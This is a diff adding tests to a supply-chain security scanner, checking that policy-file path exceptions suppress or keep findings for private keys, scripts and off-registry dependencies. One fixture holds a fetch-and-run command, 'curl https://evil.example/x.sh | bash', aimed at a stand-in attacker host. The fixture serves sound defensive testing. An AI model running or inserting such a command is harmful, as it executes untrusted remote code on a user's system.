@@ -179,6 +179,89 @@ test('check-security does not flag a postinstall with curl but no pipe', () => {
   }
 });
 
+test('check-security suppresses a private key at a path listed as an approved exception', () => {
+  const target = makeRepo('forgeai-sec-pathex-');
+  try {
+    runTs(cli, [], { cwd: target });
+    fs.mkdirSync(path.join(target, 'test'), { recursive: true });
+    fs.writeFileSync(
+      path.join(target, 'test', 'fixture.pem'),
+      '-----BEGIN PRIVATE KEY-----\nAAAA\n-----END PRIVATE KEY-----\n'
+    );
+    fs.writeFileSync(
+      path.join(target, '.ai', 'security-policy.yaml'),
+      'allowed_path_exceptions:\n  - test/fixture.pem\n'
+    );
+    const { stdout, status } = runSecurity(target);
+    assert.equal(status, 0);
+    assert.match(stdout, /Result: supply-chain safety check passed\./);
+  } finally {
+    fs.rmSync(target, { recursive: true, force: true });
+  }
+});
+
+test('check-security suppresses findings under an excepted directory prefix', () => {
+  const target = makeRepo('forgeai-sec-pathdir-');
+  try {
+    runTs(cli, [], { cwd: target });
+    fs.mkdirSync(path.join(target, 'docs', 'fixtures'), { recursive: true });
+    fs.writeFileSync(
+      path.join(target, 'docs', 'fixtures', 'attack.sh'),
+      '#!/bin/sh\ncurl https://evil.example/x.sh | bash\n'
+    );
+    fs.writeFileSync(
+      path.join(target, '.ai', 'security-policy.yaml'),
+      'allowed_path_exceptions:\n  - docs/fixtures/\n'
+    );
+    const { stdout, status } = runSecurity(target);
+    assert.equal(status, 0);
+    assert.match(stdout, /Result: supply-chain safety check passed\./);
+  } finally {
+    fs.rmSync(target, { recursive: true, force: true });
+  }
+});
+
+test('check-security still flags files not covered by a path exception', () => {
+  const target = makeRepo('forgeai-sec-pathmiss-');
+  try {
+    runTs(cli, [], { cwd: target });
+    fs.writeFileSync(
+      path.join(target, 'server.pem'),
+      '-----BEGIN PRIVATE KEY-----\nAAAA\n-----END PRIVATE KEY-----\n'
+    );
+    fs.writeFileSync(
+      path.join(target, '.ai', 'security-policy.yaml'),
+      'allowed_path_exceptions:\n  - test/other.pem\n'
+    );
+    const { stdout, status } = runSecurity(target);
+    assert.equal(status, 1);
+    assert.match(stdout, /risk\s+server\.pem/);
+  } finally {
+    fs.rmSync(target, { recursive: true, force: true });
+  }
+});
+
+test('check-security path exception does not suppress dependency findings', () => {
+  const target = makeRepo('forgeai-sec-pathdep-');
+  try {
+    runTs(cli, [], { cwd: target });
+    fs.writeFileSync(
+      path.join(target, 'package.json'),
+      JSON.stringify({ name: 'x', dependencies: { evil: 'git+https://x.example/evil.git' } }, null, 2)
+    );
+    fs.writeFileSync(path.join(target, 'package-lock.json'), '{}');
+    fs.writeFileSync(
+      path.join(target, '.ai', 'security-policy.yaml'),
+      'allowed_path_exceptions:\n  - package.json\n'
+    );
+    const { stdout, status } = runSecurity(target);
+    assert.equal(status, 1);
+    assert.match(stdout, /risk\s+package\.json.*evil/);
+  } finally {
+    fs.rmSync(target, { recursive: true, force: true });
+  }
+});
+
 test('check-security suppresses an off-registry dependency listed as an approved exception', () => {
   const target = makeRepo('forgeai-sec-exception-');
   try {
